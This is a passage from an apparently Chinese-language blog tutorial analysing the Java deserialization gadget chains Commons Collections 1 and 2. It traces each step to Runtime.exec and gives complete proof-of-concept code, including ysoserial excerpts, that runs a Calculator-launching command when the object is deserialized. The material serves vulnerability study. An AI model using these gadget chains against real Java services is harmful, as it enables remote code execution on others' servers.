Object[]&#123;&quot;getRuntime&quot;,new Class[0]&#125;)</span></span><br><span class="line">            <span class="comment">//返回的是一个Method对象</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">                String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">                <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="comment">/*相当与执行</span></span><br><span class="line"><span class="comment">            Runtime.class.getClass().getMethod(&quot;getMethod&quot;, String.class, Class[].class).invoke(Runtime.class, &quot;getRuntime&quot;, new Class[0]).</span></span><br><span class="line"><span class="comment">            getClass().getMethod(&quot;invoke&quot;, new Class[]&#123;</span></span><br><span class="line"><span class="comment">           Object.class, Object[].class&#125;).invoke(Runtime.class.getClass().getMethod(&quot;getMethod&quot;, String.class, Class[].class).invoke(Runtime.class, &quot;getRuntime&quot;, new Class[0]),new Object[]&#123;null,new Object[0]&#125;)</span></span><br><span class="line"><span class="comment">           最后返回一个Runtime实例</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">                Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">                <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="comment">//调用runtime实例调用exec方法执行命令</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open  /System/Applications/Calculator.app&quot;</span>&#125;)&#125;);</span><br><span class="line">        chain.transform(<span class="number">123</span>);</span><br><span class="line">        System.out.println(Runtime.class.getClass().getMethod(<span class="string">&quot;getMethod&quot;</span>, String.class, Class[].class).invoke(Runtime.class, <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]).getClass().getMethod(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">            Object.class, Object[].class&#125;).invoke(Runtime.class.getClass().getMethod(<span class="string">&quot;getMethod&quot;</span>, String.class, Class[].class).invoke(Runtime.class, <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]), <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>因为是要在反序列化时触发所以需要找到一个序列化的点其中调用了<code>transform</code>方法，接下来就是链的前段部分，<code>LazyMap.get()</code>方法中<code>factory</code>调用了<code>transform</code>方法。</p><p><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2020/12/29/16063188969042.jpg"                        alt="-w816"                 ><br><code>factory</code>对象的类型为<code>protected final</code>没有被<code>static</code>与<code>transient</code>修饰，并且可由类初始化赋值，所以是可被序列化控制的。<br><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2020/12/29/16063192091624.jpg"                        alt="-w541"                 ></p><p><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2020/12/29/16063191490154.jpg"                        alt="-w743"                 ><br>因为此构造方法被<code>protected</code>所修饰，所以无法直接构建可通过反射或者<code>LazyMap.decorate()</code>方法来构建。</p><p><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2020/12/29/16063203394830.jpg"                        alt="-w650"                 ></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="comment">//传入Runtime类</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">            * 相当于执行 Runtime.class.getClass().getMethod(&quot;getMethod&quot;, String.class, Class[].class).invoke(Runtime.class,new Object[]&#123;&quot;getRuntime&quot;,new Class[0]&#125;)</span></span><br><span class="line"><span class="comment">            * 通过反射来反射最后返回的是一个Method对象</span></span><br><span class="line"><span class="comment">            *</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">                String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">                <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="comment">/*相当与执行</span></span><br><span class="line"><span class="comment">            Runtime.class.getClass().getMethod(&quot;getMethod&quot;, String.class, Class[].class).invoke(Runtime.class, &quot;getRuntime&quot;, new Class[0]).</span></span><br><span class="line"><span class="comment">            getClass().getMethod(&quot;invoke&quot;, new Class[]&#123;</span></span><br><span class="line"><span class="comment">           Object.class, Object[].class&#125;).invoke(Runtime.class.getClass().getMethod(&quot;getMethod&quot;, String.class, Class[].class).invoke(Runtime.class, &quot;getRuntime&quot;, new Class[0]),new Object[]&#123;null,new Object[0]&#125;)</span></span><br><span class="line"><span class="comment">           最后返回一个Runtime实例</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">                Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">                <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="comment">//调用runtime实例调用exec方法执行命令</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open  /System/Applications/Calculator.app&quot;</span>&#125;)&#125;);</span><br><span class="line"><span class="comment">//        System.out.println(Runtime.class.getClass().getMethod(&quot;getMethod&quot;, String.class, Class[].class).invoke(Runtime.class, &quot;getRuntime&quot;, new Class[0]).getClass().getMethod(&quot;invoke&quot;, new Class[]&#123;</span></span><br><span class="line"><span class="comment">//            Object.class, Object[].class&#125;).invoke(Runtime.class.getClass().getMethod(&quot;getMethod&quot;, String.class, Class[].class).invoke(Runtime.class, &quot;getRuntime&quot;, new Class[0]), null, new Object[0]));</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazymap</span> <span class="operator">=</span> LazyMap.decorate(map, chain);</span><br><span class="line">        lazymap.get(<span class="number">111</span>);</span><br></pre></td></tr></table></figure><p>接下来就是要寻找哪里使用了<code>LazyMap.get()</code>，这就到了CC1链的前段部分<code>AnnotationInvocationHandler</code>了，首先是<code>invoke</code>方法中调用了<code>memberValues.get()</code>，</p><p><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2020/12/29/16066407114862.jpg"                        alt="-w933"                 ><br>再看<code>memberValues</code>是由<code>AnnotationInvocationHandler</code>类的构造方法传入而来，而此类实现了<code>InvocationHandler</code>是一个<code>Handler</code>，在调用这个类的某个方法时可以触发代理类的<code>invoke</code>方法<br><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2020/12/29/16066407922584.jpg"                        alt="-w900"                 ><br>在<code>AnnotationInvocationHandler.readObject</code>方法中调用了<code>memberValues.entrySet().iterator()</code>，如果传入的<code>memberValues</code>是一个代理类就会触发<code>memberValues</code>对应<code>Handler</code>的<code>invoke</code>方法(AnnotationInvocationHandler恰好是<code>Handler</code>)从而触发<code>LazyMap.get()</code>。<br><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2020/12/29/16066413371102.jpg"                        alt="-w1333"                 ></p><p>完整利用POC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="comment">//传入Runtime类</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">            * 相当于执行 Runtime.class.getClass().getMethod(&quot;getMethod&quot;, String.class, Class[].class).invoke(Runtime.class,new Object[]&#123;&quot;getRuntime&quot;,new Class[0]&#125;)</span></span><br><span class="line"><span class="comment">            * 通过反射来反射最后返回的是一个Method对象</span></span><br><span class="line"><span class="comment">            *</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">                String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">                <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">/*相当与执行</span></span><br><span class="line"><span class="comment">            Runtime.class.getClass().getMethod(&quot;getMethod&quot;, String.class, Class[].class).invoke(Runtime.class, &quot;getRuntime&quot;, new Class[0]).</span></span><br><span class="line"><span class="comment">            getClass().getMethod(&quot;invoke&quot;, new Class[]&#123;</span></span><br><span class="line"><span class="comment">           Object.class, Object[].class&#125;).invoke(Runtime.class.getClass().getMethod(&quot;getMethod&quot;, String.class, Class[].class).invoke(Runtime.class, &quot;getRuntime&quot;, new Class[0]),new Object[]&#123;null,new Object[0]&#125;)</span></span><br><span class="line"><span class="comment">           最后返回一个Runtime实例</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">                Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">                <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="comment">//调用runtime实例调用exec方法执行命令</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open  /System/Applications/Calculator.app&quot;</span>&#125;)&#125;);</span><br><span class="line"><span class="comment">//        System.out.println(Runtime.class.getClass().getMethod(&quot;getMethod&quot;, String.class, Class[].class).invoke(Runtime.class, &quot;getRuntime&quot;, new Class[0]).getClass().getMethod(&quot;invoke&quot;, new Class[]&#123;</span></span><br><span class="line"><span class="comment">//            Object.class, Object[].class&#125;).invoke(Runtime.class.getClass().getMethod(&quot;getMethod&quot;, String.class, Class[].class).invoke(Runtime.class, &quot;getRuntime&quot;, new Class[0]), null, new Object[0]));</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazymap</span> <span class="operator">=</span> LazyMap.decorate(map, chain);</span><br><span class="line">        <span class="comment">//动态代理 触发LazyMap.get</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">handlerConstructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        handlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">mapHandler</span> <span class="operator">=</span> (InvocationHandler) handlerConstructor.newInstance(Override.class,lazymap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,mapHandler);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//触发 AnnotationInvocationHandler.invoke</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">aihConstructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        aihConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) aihConstructor.newInstance(Override.class, proxyMap);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./cc1.ser&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(handler);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./cc1.ser&quot;</span>));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里创建了两个<code>Handler</code>：</p><ul><li><code>mapHandler</code></li><li><code>handler</code></li></ul><p>流程是<br>    <code>AnnotationInvocationHandler.readObject</code>-&gt;<code>this.memberValues.entrySet()</code>(<code>proxyMap.entrySet()</code>)-&gt;<code>mapHandler.invoke</code>-&gt;<code>AnnotationInvocationHandler.invoke</code>此时<code>memberValues</code>为<code>lazymap</code>-&gt;<code>this.memberValues.get(var4)</code>（即<code>lazymap.get(va4)</code>）</p><h3 id="Commons-Collections2"><a href="#Commons-Collections2" class="headerlink" title="Commons Collections2"></a>Commons Collections2</h3><h4 id="Gadget-Chain-2"><a href="#Gadget-Chain-2" class="headerlink" title="Gadget Chain"></a>Gadget Chain</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">PriorityQueue.readObject()</span><br><span class="line">...</span><br><span class="line">TransformingComparator.compare()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Runtime.exec()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>根据利用链进行分析首先是<code>PriorityQueue.readObject()</code><br><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2020/12/29/16075068907272.jpg"                        alt="-w723"                 >对输入流进行了反序列化来恢复对象数据，然后进入到<code>heapify</code>方法。<br><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2020/12/29/16075070251684.jpg"                        alt="-w638"                 ><br>此方法先判断了队列数量是否大于2（<code>（size &gt;&gt;&gt; 1)-1 右移一位-1的结果要大于或等于0才满足循环条件</code>）如果大于2则进入到<code>siftDown</code>方法<br><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2020/12/29/16075073116693.jpg"                        alt="-w769"                 ><br>这里如果属性<code>comparator</code>不为<code>null</code>则进入到<code>siftDownUsingComparator</code>方法，在此方法中执行了<code>comparator.compare</code>方法，<code>comparator</code>可以通过实例化<code>PriorityQueue</code>对象时传入。接着进入了链的下一个<code>TransformingComparator</code>类</p><p><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2020/12/29/16075888589357.jpg"                        alt="-w957"                 ></p><p>此类存在一个<code>compare</code>方法而且方法中调用了<code>transform</code>方法，只要<code>this.transoformer</code>可控，那么结合cc1中的<code>ChainedTransformer</code>那么就可以执行命令了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">  <span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123; String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123; Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open  /System/Applications/Calculator.app&quot;</span>&#125;)</span><br><span class="line">        &#125;);</span><br><span class="line"><span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>((org.apache.commons.collections4.Transformer) chain);</span><br><span class="line"><span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>();</span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line">queue.add(<span class="number">2</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">field.set(queue,comparator);</span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./ss2.ser&quot;</span>));</span><br><span class="line">out.writeObject(queue);</span><br><span class="line">out.close();</span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./ss2.ser&quot;</span>));</span><br><span class="line">os.readObject();</span><br><span class="line">os.close();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2020/12/29/16076772917491.jpg"                        alt="-w1418"                 ><br>在ysoserial中是怎么利用的呢？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">      <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">templates</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(command);</span><br><span class="line"><span class="comment">// mock method name until armed</span></span><br><span class="line"><span class="keyword">final</span> <span class="type">InvokerTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;toString&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// create queue with numbers and basic comparator</span></span><br><span class="line"><span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>,<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer));</span><br><span class="line"><span class="comment">// stub data for replacement later</span></span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// switch method called by comparator</span></span><br><span class="line">Reflections.setFieldValue(transformer, <span class="string">&quot;iMethodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// switch contents of queue</span></span><br><span class="line"><span class="keyword">final</span> Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, <span class="string">&quot;queue&quot;</span>);</span><br><span class="line">queueArray[<span class="number">0</span>] = templates;</span><br><span class="line">queueArray[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> queue;</span><br></pre></td></tr></table></figure><p>首先是将命令传入到<code>createTemplatesImpl</code>方法<br><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2020/12/29/16076778534072.jpg"                        alt="-w1101"                 ><br>不满足条件则进入到<code>createTemplatesImpl</code>的另一个重载方法</p><p><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2020/12/29/16076804613023.jpg"                        alt="-w1258"                 ><br>使用<code>javassist</code>创建了一个继承<code>AbstractTranslet</code>的类<br><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2020/12/29/16076805488865.jpg"                        alt="-w1211"                 ><br><code>static</code>语句块会在类初始化执行<br><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2020/12/29/16076810738760.jpg"                        alt="-w967"                 ><br>这里的<code>Foo.class</code>以及<code>_tfactory</code>属性是可以不用设置的，<code>_name</code>是必须要设置的原因是在<code>TemplatesImpl.newTransformer</code>时会进入到<code>getTransletInstance</code>方法，此方法中会验证<code>_name</code>属性是否为<code>null</code>。<br><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2020/12/29/16076825957038.jpg"                        alt="-w733"                 ><br>最后返回一个TemplatesImpl对象，继续到链的<code>InvokerTransformer</code>中<br><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2020/12/29/16076829155168.jpg"                        alt="-w1058"                 ></p><p><code>这里创建了一个</code>InvokerTransformer<code>对象，</code>methodName<code>使用</code>toString<code>做填充没有其他作用。下面就是创建链的前半部分，通过反射将</code>transformer<code>的</code>iMethodName<code>修改为</code>newTransformer<code>并将</code>queue[0]<code>的值修改为</code>templates`。<br><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2020/12/29/16085233762886.jpg"                        alt="-w1002"                 ></p><p>poc:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建执行命令template</span></span><br><span class="line">       <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">       <span class="comment">//将一个ClassPath加到类搜索路径的末尾位置或插入到起始位置，避免搜索不到此class位置的情况</span></span><br><span class="line">       pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">       <span class="comment">//根据类路径名获取该类的CtClass对象</span></span><br><span class="line">       <span class="type">CtClass</span> <span class="variable">ctc</span> <span class="operator">=</span>pool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">       <span class="comment">//cmd</span></span><br><span class="line">       <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;open  /System/Applications/Calculator.app\&quot;);&quot;</span>;</span><br><span class="line"></span><br><span class="line">       <span 